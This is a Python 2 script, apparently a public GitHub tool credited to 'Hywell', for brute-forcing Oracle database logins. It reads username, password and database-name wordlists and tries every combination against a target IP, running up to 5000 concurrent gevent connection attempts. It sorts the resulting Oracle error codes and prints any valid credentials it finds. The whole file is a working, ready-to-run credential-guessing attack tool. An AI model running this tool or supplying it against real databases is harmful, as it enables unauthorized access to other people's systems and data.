#!/usr/bin/env python
# -*- coding: utf-8 -*-

import getopt
import sys
import gevent
from gevent.queue import Queue
import cx_Oracle
from datetime import datetime
from colorama import init, Fore, Style


class Brute:
    def __init__(self, ip, attack):
        self.ip = ip
        self.attack = attack
        self.threads = []
        self.result = []

    def _attack(self, weak):
        user = weak.split('/')[0]
        passwd = weak.split('/')[1].split('@')[0]
        ip = weak.split('@')[1].split('/')[0]
        databases = weak.split('@')[1].split('/')[1]
        print(Fore.GREEN + Style.DIM + '[' + datetime.now().strftime(
            '%H:%M:%S') + '] [ATTEMPT] target ' + ip + ' - login "' + user + '" - pass "' + passwd + '" - databases "'
              + databases + '"')
        try:
            cx_Oracle.connect(weak)
            self.result.append(weak)
        except cx_Oracle.DatabaseError as e:
            if 'ORA-12514' in str(e):
                print(Fore.YELLOW + Style.DIM + '[' + datetime.now().strftime('%H:%M:%S') +
                      '] [Error] Databases is Error!')
            elif 'ORA-01017' in str(e):
                print(Fore.YELLOW + Style.DIM + '[' + datetime.now().strftime(
                    '%H:%M:%S') + '] [Error] User or Password is Error!')
            elif 'ORA-12170' in str(e):
                print(Fore.RED + Style.DIM + '[' + datetime.now().strftime('%H:%M:%S') + '] [Error] IP is Error!')

    def work(self):
        print Fore.GREEN + Style.DIM + '[' + datetime.now().strftime('%H:%M:%S') + '] [DATA] attacking service oracle'
        while True:
            if not self.attack.empty():
                if len(self.threads) < 5000:
                    self.threads.append(gevent.spawn(self._attack, self.attack.get()))
                else:
                    gevent.joinall(self.threads)
                    self.threads = []
            else:
                if len(self.threads) > 0:
                    gevent.joinall(self.threads)
                break
        if self.result:
            return self.output(True)
        else:
            return self.output(False)

    def output(self, result):
        if result:
            for i in self.result:
                user = i.split('/')[0]
                passwd = i.split('/')[1].split('@')[0]
                ip = i.split('@')[1].split('/')[0]
                databases = i.split('@')[1].split('/')[1]
                print Fore.GREEN + Style.DIM + '[Success] [Oracle] host:' + ip + '  login:  ' + user + '  password:  ' + passwd + '  databases:  ' + databases
                print Fore.GREEN + Style.DIM + '1 of 1 target successfully completed, valid password found'
        else:
            print Fore.RED + Style.DIM + '[Failed] 1 of 1 target successfully completed, valid password not found'
        print(Fore.GREEN + Style.DIM + 'Hywell (https://github.com/hywell).Oracle Brute finished at '
              + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '\n')


def main():
    print Fore.GREEN + Style.DIM + """
     _        _   _      _  _    __    _  __________  _           _
    | |      | | \ \    / /| |  /  \  | ||  ________|| |         | |
    | |______| |  \ \  / / | | / /\ \ | || |________ | |         | |
    |  ______  |   \ \/ /  | | | || | | ||  ________|| |         | |
    | |      | |    \  /   | |_| || |_| || |         | |         | |
    | |      | |    |  |    \   /  \   / | |________ | |________ | |________
    |_|      |_|    |__|     \_/    \_/  |__________||__________||__________|

        """
    print(Fore.GREEN + Style.DIM + 'Hywell (https://github.com/hywell).Oracle Brute starting at '
          + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '\n')
    ip = None
    user = None
    passwd = None
    databases = None
    user_dict = []
    password_dict = []
    databases_dict = []
    attack = Queue()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "-h-u:-p:-d:-i:")
        if ('-h', '') in opts:
            print Fore.RED + 'python Oracle_Brute.py -i 127.0.0.1 -u user.txt -p password.txt -d databases.txt'
            exit()
        for opt_name, opt_value in opts:
            if opt_name in '-i':
                ip = opt_value
            elif opt_name in '-u':
                user = opt_value
            elif opt_name in '-p':
                passwd = opt_value
            elif opt_name in '-d':
                databases = opt_value
        with open(user, 'r') as fu:
            for i in fu.readlines():
                user_dict.append(i.rstrip())
        with open(passwd, 'r') as fp:
            for i in fp.readlines():
                password_dict.append(i.rstrip())
        with open(databases, 'r') as fd:
            for i in fd.readlines():
                databases_dict.append(i.rstrip())
        for u in user_dict:
            for p in password_dict:
                for d in databases_dict:
                    attack.put(u.rstrip() + '/' + p.rstrip() + '@' + ip + '/' + d.rstrip())
    except (getopt.GetoptError, IOError, TypeError):
        print Fore.RED + 'You can use -h to get help!'
        exit()
    Brute(ip, attack).work()


if __name__ == '__main__':
    init(autoreset=True)
    main()
